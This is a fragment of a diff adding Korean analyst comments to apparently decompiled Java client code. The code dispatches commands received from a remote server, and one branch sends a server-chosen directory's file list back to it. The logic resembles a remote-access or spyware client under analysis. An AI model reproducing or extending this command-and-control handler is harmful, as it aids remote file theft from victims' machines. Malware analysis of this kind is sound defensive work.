@@ -103,11 +103,12 @@ public class client {
                      try {
                         String[] var21;
                         // k.d 즉, $#@으로 파싱한다.
-                        if ((var21 = var16.split("\\" + k.d))[0].equals(k.m)) { // @0000 인가?
+                        // 서버로부터 명령을 받은 대로 실행한다.
+                        if ((var21 = var16.split("\\" + k.d))[0].equals(k.m)) { // @0000
                            new e();
                            e.a();
                            (new f()).start();
-                        } else if (var21[0].equals(k.n)) {
+                        } else if (var21[0].equals(k.n)) { // @0001
                            // send file list of path "var21[1]\" to server
                            (new c(var21[1])).start();
                         } else if (var21[0].equals(k.o)) {
